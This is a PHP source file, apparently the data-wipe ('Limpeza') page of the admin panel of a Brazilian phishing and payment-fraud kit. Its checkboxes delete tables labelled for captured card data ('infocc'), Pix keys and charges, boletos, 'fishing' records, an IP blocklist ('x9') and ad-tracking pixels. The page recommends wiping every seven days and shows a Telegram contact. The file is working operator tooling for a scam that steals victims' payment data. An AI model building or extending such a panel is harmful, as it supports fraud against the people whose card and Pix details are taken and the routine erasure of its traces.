<?php
   session_start();
   if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
       header("Location: ./");
       exit;
   }
   include("config.php");
   
   if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["check_list"])) {
       foreach ($_POST["check_list"] as $item) {
           switch ($item) {
               case "pix":
                   $conn->query("DELETE FROM pix");
                   break;
               case "infopix":
                   $conn->query("UPDATE relatorio SET visitas = 0");
                   break;
               case "infospix":
                   $conn->query("UPDATE relatorio_gateway SET visitas = 0");
                   break;
               case "infospix2":
                   $conn->query("DELETE FROM infospix");
                   break;
               case "infocc":
                   $conn->query("DELETE FROM infocc");
                   break;
               case "fishing":
                   $conn->query("DELETE FROM fishing"); 
                   break;
               case "pixeltiktok":
                   $conn->query("DELETE FROM tiktok");
                   break;
               case "pixelface":
                   $conn->query("DELETE FROM pixel");
                   break;
               case "visitas":
                   $conn->query("UPDATE acessos SET visitas = 0");
                   break;
               case "x9":
                   $conn->query("DELETE FROM ipsblock");
                   break;
               case "pixelUtmify":
                   $conn->query("DELETE FROM utmify");
                   break;
               case "infoconsul":
                   $conn->query("DELETE FROM infoconsul");
                   break;
               case "infovirtual":
                   $conn->query("DELETE FROM infovirtual");
                   break;
               case "infospix":
                   $conn->query("DELETE FROM infospix");
                   break;
               case "login":
                   $conn->query("DELETE FROM login");
                   break;
               case "boletogr":
                   $conn->query("UPDATE infoleto SET visitas = 0");
                   break;
               case "boletogw":
                   $conn->query("UPDATE relatorio_gateway2 SET visitas = 0");
                   break;
               case "boletofish":
                   $conn->query("DELETE FROM infoletos");
                   break;
               case "produto":
                   $conn->query("DELETE FROM produtos");
                   break;
               case "online":
                   $conn->query("DELETE FROM onlines");
                   break;
           }
   
           echo '
   <link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet"/>
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
   
   <script>
       $(function() {
           toastr.options.timeOut = false;
           toastr.options.closeButton = true;
           toastr.options.positionClass = "toast-top-right";
           toastr["success"]("Os dados de ' . addslashes($item) . ' foram resetados com sucesso!");
           setTimeout(function() {
               window.location.href = "?COMON=/ADMIN&acesso=Limpeza";
           }, 7000);
       });
   </script>';
       }
   }
   ?>
<!doctype html>
<html lang="pt-br" data-theme="dark">
   <?php include('head.php'); ?>
   <body data-theme="light">
      <div id="body" class="theme-cyan">
      <?php include('theme.php'); ?>
      <div class="overlay"></div>
      <div id="wrapper">
      <?php include('submenu.php'); ?>
      <?php include('menu.php'); ?>
      <div id="main-content">
      <div class="container-fluid">
         <div class="block-header">
            <div class="row clearfix">
               <div class="col-lg-4 col-md-12 col-sm-12">
                  <h1>Olá  admin, você está em  / Limpeza</h1>
                  <span>TXT_JPGI1 - @TXT_JPGI1 <== no telegram! </span>
               </div>
            </div>
         </div>
         <div class="card">
            <div class="card-header">
               <strong>Limpar dados</strong>
            </div>
            <div class="card-body card-block">
               <form action="" method="post"  name="formu" class="form-horizontal">
                  <div class="row form-group">
                     <div class="col col-md-3"><label for="text-input" class=" form-control-label">Tabelas a serem limpas</label></div>
                     <div class="col-12 col-md-9">
                        <input type="checkbox" name="check_list[]" value="visitas"   />   -   Total De Visitas </br>
                        <input type="checkbox" name="check_list[]" value="online" /> - Onlines ( Total ) <br>
                        <input type="checkbox" name="check_list[]" value="x9"   />   -   x9 ( Totais ) </br>
                        <input type="checkbox" name="check_list[]" value="pix"   />   -   Chaves Pix </br>
                        <input type="checkbox" name="check_list[]" value="infopix"   />   -   Pix Gerado ( Manual ) </br>
                        <input type="checkbox" name="check_list[]" value="infospix"   />   -   Pix Gerado ( Gateway ) </br>
                        <input type="checkbox" name="check_list[]" value="infospix2" /> - Pix Gerado ( Fishing ) <br>
                        <input type="checkbox" name="check_list[]" value="infocc"   />   -   InfosCC </br>
                        <input type="checkbox" name="check_list[]" value="infoconsul"   />   -   InfosConsul </br>
                        <input type="checkbox" name="check_list[]" value="infovirtual"   />   -   InfosVirtual </br>
                        <input type="checkbox" name="check_list[]" value="pixelface" /> - Pixel ( Facebook ) <br>
                        <input type="checkbox" name="check_list[]" value="pixeltiktok" /> - Pixel ( TikTok ) <br>
                        <input type="checkbox" name="check_list[]" value="pixelUtmify" /> - Pixel ( Utmify ) <br>
                        <small>Recomendado limpar a cada 7 dias</small> <br>
                     </div>
                  </div>
            </div>
            <div class="row form-group">
            <div class="col-12">
            &emsp;<button type="button" id="toggle-checks" class="btn btn-primary btn-sm" onclick="selecionarTodos()">Selecionar Todos</button>
            </div>
            </div>
            <div class="card-footer">
            <button type="submit" class="btn btn-primary btn-sm">
            <i class="fa fa-dot-circle-o"></i> LIMPAR
            </button>
            </form>
            </div>
         </div>
      </div>
      <script>
         const botaoToggle = document.querySelector('button#toggle-checks'); 
         
         function selecionarTodos() {
             const checkboxes = document.querySelectorAll('input[name="check_list[]"]');
             const todosMarcados = Array.from(checkboxes).every(cb => cb.checked);
         
             if (todosMarcados) {
                 checkboxes.forEach(cb => cb.checked = false);
                 botaoToggle.textContent = 'Selecionar Todos';
             } else {
                 checkboxes.forEach(cb => cb.checked = true);
                 botaoToggle.textContent = 'Remover Todos';
             }
         }
      </script>